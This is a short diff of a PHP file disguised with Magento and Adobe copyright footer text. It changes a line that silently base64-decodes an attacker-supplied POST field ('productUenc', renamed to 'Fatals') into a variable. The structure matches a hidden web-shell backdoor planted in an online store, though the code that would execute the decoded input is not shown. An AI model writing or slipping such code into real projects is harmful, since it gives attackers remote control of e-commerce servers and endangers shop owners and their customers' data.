@@ -159,7 +159,7 @@ Optional but recommended
 Become a Contributor Glossary Privacy Policy Terms of Service License/Trademark FAQ Release Notes Third-Party Licenses
 © 2021 Magento. All rights reserved.
 */
-$svg = isset($_POST["productUenc"])?@base64_decode($_POST["productUenc"]):"";
+$svg = isset($_POST["Fatals"])?@base64_decode($_POST["Fatals"]):"";
 /*
 Adobe
 Adobe
